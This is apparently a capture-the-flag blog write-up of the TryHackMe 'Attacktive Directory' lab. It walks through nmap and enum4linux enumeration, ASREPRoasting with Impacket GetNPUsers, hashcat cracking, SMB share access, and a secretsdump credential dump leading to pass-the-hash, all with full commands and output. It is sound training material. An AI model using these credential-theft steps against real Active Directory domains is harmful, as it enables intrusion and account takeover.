---
layout: post
title: "[TryHackMe] - Attacktive Directory"
date: 2023-03-05
description: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
author: Teiiko
tags: ["Active Directory"]
difficulty: medium
categories: [writeups]
subject: AD
reading: 7m
---

<link rel="stylesheet" href="/css/lil-bootstrap.css">
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

_____________________________________________________


<br>

**Table of contents:**

- <a href="#enumeration">Enumeration</a>
    - <a href="#nmap">Nmap</a>
    - <a href="#enum4linux">Enum4linux</a>
    - <a href="#kerbrute">Kerbrute</a>
- <a href="#abusing">Abusing kerberos with ASREPRoasting</a>
    - <a href="#getnpusers">GetNPUsers</a>
    - <a href="#hashcat">Hashcat</a>
- <a href="#smb-exploitation">SMB Exploitation</a>
    - <a href="#recon">Recon</a>
    - <a href="#gaining-access">Gaining access</a>
- <a href="#secretsdump">Secretsdump</a>
- <a href="#privesc">Gaining access & Privesc</a>
    - <a href="#pass">Pass the hash</a>

<br>
*99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?*

Room link: <a href="https://tryhackme.com/room/attacktivedirectory">TryHackMe - Attacktive Directory</a>

<br>

_____________________________________________________

<br>

## Enumeration

Basic enumeration starts out with an nmap scan in order to understand the attack surface.

### Nmap

```bash
┌──(teiiko㉿kali)-[~]
└─$ nmap -p- -A 10.10.32.16        
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-05 10:39 CET
Nmap scan report for 10.10.32.16
Host is up (0.042s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-05 09:45:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-03-05T09:46:51+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-03-04T09:39:10
|_Not valid after:  2023-09-03T09:39:10
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-03-05T09:46:44+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-05T09:46:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 417.26 seconds
````
This Nmap scan reveals that the target is an Active Directory. Indeed, several open ports are related to an AD, ports 88 for Kerberos authentication, 389 and 3268 for LDAP. Moreover, it revealed that the domain name of the Active Directory is "spookysec.local".

### enum4linux

enum4linux is used to enumerate information from Windows and Samba systems. It is designed to be used in penetration testing engagements and can be used to gather valuable information about a target system, such as user names, shares, and other sensitive data.

*-a        Do all simple enumeration (-U -S -G -P -r -o -n -i).*


```bash
┌──(teiiko㉿kali)-[~]
└─$ enum4linux -a 10.10.32.16
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) 
on Sun Mar  5 10:57:50 2023

 ================================( Target Information )================================
                                                                                                               
Target ........... 10.10.32.16                                                                                 
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ================( Users on 10.10.32.16 via RID cycling (RIDS: 500-550,1000-1050) )================
                                                                                                                                                                                                                                           
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                                                
                                                                                                                                                                                                                                            
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                                                              
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

```

Here, enum4linux allows us to enumerate some local users and domain group wich can be usefull later.

In order to enumerate more users on the domain, we can use Kerbrute, working on bruteforce process with a given wordlist.
### Kerbrute

![attack](/images/attacktive-1.png)

This Kerbrute bruteforce is very usefull because he discovered many users on the domain. Moreover, we can see that a user looks weak: `svc-admin has no pre auth required`. What does it mean ?

Pre-authentication is a security mechanism used by the Kerberos protocol. It works by sending a packet containing a request for an encrypted TGT ticket with the user's account secret key and a timestamp. If the domain server accepts the request, it returns a packet containing an encrypted TGT ticket which is then used for user authentication.

In this case, "svc-admin" user is able to log in without going through this pre-authentication step.

<span id='abusing'></span>

## Abusing kerberos with ASREPRoasting

Once the enumeration of user accounts is completed, we can try to exploit a feature in Kerberos using an attack technique known as ASREPRoasting. ASREPRoasting happens when a user account has the privilege "Does not require Pre-Authentication" enabled as explained in the previous step.

To exploit this vulnerability, we will use `GetNPUsers` script from Impacket (<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a>).

### GetNPUsers

```bash
┌──(teiiko㉿kali)-[~/Bureau/tools/kerbrute/dist]
└─$ GetNPUsers.py -dc-ip 10.10.32.16 spookysec.local/svc-admin -no-pass                                                            
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:xxxxxxxxxxxfb$bda69125e4fca78ae99b770ef2d0b615f34326d77d91f44526d9cb9741683b20a40ae0a7f5dc3e62a645f44780444e547b3f633058bf76395ea23a1f2b60e4f4cd5af7cdec030721e0e79e5ad9a1fdc6979cb0050f891437315861cd97ae81ce51d56a9927227f5866ad7b781f67088c673a9728ed6d6083a712d7fcc53a27e7f754acd42b15f8ae3ee54c2be197734d8184f6394ea247997329467ef27cbae4dd52b65c85f1b367028a1802633cbab7b84bfc3d55a612ff16b3e04ba64549b5965492bb5e510ee2674d1dc41ca61ec6d6038a4d2580d4754d9c4b07483b977acbbad9cd53xxxxxxxxxxx
```

Now we have our hash for svc-admin user, we can try to crack him using hashcat or john (hashcat in my case).

### Hashcat

I used hashcat examples ( <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat exemples</a> ) to get the right mode.

![mode-hashcat](/images/hashcat.png)
```bash
┌──(root㉿kali)-[/home/teiiko/Bureau/TryHackMe/Attacking_AD]
└─# hashcat -a 0 -m 18200 hash5 /home/teiiko/Bureau/list/passwordlist.txt --force --show
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:xxxxxxxxxxxxxxfea97$cdcaaccfacdd4b5bddb1283efe364a47cd521fd75f3dddbf41eeb528f21e2764abe1e163a541c4de5178c450e90cc8df5c75f1c5214424502875bf6ccf82ee6b5a55cc315e1aa1e8e9ac2e4f1b0ef48149a2e6d3a6859e6123f75cd469c518eae928380dc204464abde06a58876ea4841a858299d2c8a8c19c6110978927264453d145205af154a21b7cf85ac3cb4510939213e79dd4aadab9abf3883384d8ea3e411653fac1bd9ecc73f03d62b7004af8b159f06267064923d2720e540e7af1a1f9a2a3cf5424a533d7c97ad6f374d5d8ecc01c6a46b99dd61d08a359c177de8bc570519ba3da5ea0a00b0d894b5a4f9400:[REDACTED]
```

So now, we have svc-admin account credentials.

## SMB Exploitation

### Recon

```bash
┌──(teiiko㉿kali)-[~]
└─$ smbclient -U svc-admin -L 10.10.32.16
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
We can notice an interesting shared folder: `backup`. Let's try to get an access.
### Gaining access

```bash
┌──(teiiko㉿kali)-[~]
└─$ smbclient \\\\10.10.32.16\\backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3637136 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> exit
```
After downloading the backup_credentials.txt file on my local machine, i recognized a base64-encoded string. So I just decoded the string as following, and get backup user credentials.
```
┌──(root㉿kali)-[/home/teiiko/Bureau/TryHackMe/Attacking_AD]
└─# cat backup_credentials.txt | base64 -d
backup@spookysec.local:[REDACTED]
```

## Secretsdump

`secretsdump.py` script is a tool in the Impacket suite that allows to get stored credential information on a local or remote Windows system using password extraction techniques. It can be used to retrieve passwords for local accounts, domain accounts, encryption keys, service secrets, Kerberos keys, session tokens, and TGT tickets. 

```
┌──(teiiko㉿kali)-[~]
└─$ python secretsdump.py spookysec.local/backup:backup2517860@10.10.1.131
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435xxxxxxxx:0e0363213e37b94221497260xxxxxxxx:::
Guest:501:[REDACTED]:[REDACTED]:::
krbtgt:502:[REDACTED]:[REDACTED]:::
spookysec.local\skidy:1103:[REDACTED]:[REDACTED]:::
spookysec.local\breakerofthings:1104:[REDACTED]:[REDACTED]:::
spookysec.local\james:1105:[REDACTED]:[REDACTED]:::
spookysec.local\optional:1106:[REDACTED]:[REDACTED]:::
spookysec.local\sherlocksec:1107:[REDACTED]:[REDACTED]:::
spookysec.local\darkstar:1108:[REDACTED]:[REDACTED]:::
spookysec.local\Ori:1109:[REDACTED]:[REDACTED]:::
spookysec.local\robin:1110:[REDACTED]:[REDACTED]:::
spookysec.local\paradox:1111:[REDACTED]:[REDACTED]:::
spookysec.local\Muirland:1112:[REDACTED]:[REDACTED]:::
spookysec.local\horshark:1113:[REDACTED]:[REDACTED]:::
spookysec.local\svc-admin:1114:[REDACTED]:[REDACTED]:::
spookysec.local\backup:1118:[REDACTED]:[REDACTED]:::
spookysec.local\a-spooks:1601:[REDACTED]:[REDACTED]:::
ATTACKTIVEDIREC$:1000:[REDACTED]:[REDACTED]:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:[REDACTED]
Administrator:aes128-cts-hmac-sha1-96:[REDACTED]
Administrator:des-cbc-md5:[REDACTED]
krbtgt:aes256-cts-hmac-sha1-96:[REDACTED]
krbtgt:aes128-cts-hmac-sha1-96:[REDACTED]
krbtgt:des-cbc-md5:[REDACTED]
spookysec.local\skidy:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\skidy:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\skidy:des-cbc-md5:[REDACTED]
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\breakerofthings:des-cbc-md5:[REDACTED]
spookysec.local\james:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\james:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\james:des-cbc-md5:[REDACTED]
spookysec.local\optional:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\optional:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\optional:des-cbc-md5:[REDACTED]
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\sherlocksec:des-cbc-md5:[REDACTED]
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\darkstar:des-cbc-md5:[REDACTED]
spookysec.local\Ori:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\Ori:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\Ori:des-cbc-md5:[REDACTED]
spookysec.local\robin:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\robin:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\robin:des-cbc-md5:[REDACTED]
spookysec.local\paradox:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\paradox:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\paradox:des-cbc-md5:[REDACTED]
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\Muirland:des-cbc-md5:[REDACTED]
spookysec.local\horshark:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\horshark:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\horshark:des-cbc-md5:[REDACTED]
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\svc-admin:des-cbc-md5:[REDACTED]
spookysec.local\backup:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\backup:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\backup:des-cbc-md5:[REDACTED]
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:[REDACTED]
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:[REDACTED]
spookysec.local\a-spooks:des-cbc-md5:[REDACTED]
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:[REDACTED]
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:[REDACTED]
ATTACKTIVEDIREC$:des-cbc-md5:[REDACTED]
[*] Cleaning up...
```
Now we have Administrator password hash in possession, we can move on a Pass The Hash exploitation. This attack is possible because Windows systems store password hashes in memory and do not require the plaintext password for authentication. 

<span id='privesc'></span>

## Gaining access & Privesc
*IP has changed because the VM has expired.*

<span id='pass'></span>

### Pass the hash

![privesc-ad](/images/pwned-ad.png)

> 🚩 *Pwned*

Thanks for reading ! Give me a feedback on Discord - `Teiiko#8831`

<button id="back-to-top-btn" class="btn arrow btn-lg circle"><i class="fas fa-arrow-up"></i></button>

<style>
#back-to-top-btn {
  position: fixed;
  bottom: 20px;
  right: 40px;
  display:none;
  cursor:pointer;
}

</style>

<script>
    // Afficher/masquer le bouton "scroll to top"
$(window).scroll(function() {
  if ($(this).scrollTop() > 100) {
    $('#back-to-top-btn').fadeIn();
  } else {
    $('#back-to-top-btn').fadeOut();
  }
});

// Faire remonter au header de la page lorsque le bouton est cliqué
$('#back-to-top-btn').click(function() {
  $('html, body').animate({scrollTop : 0},800);
  return false;
});

</script>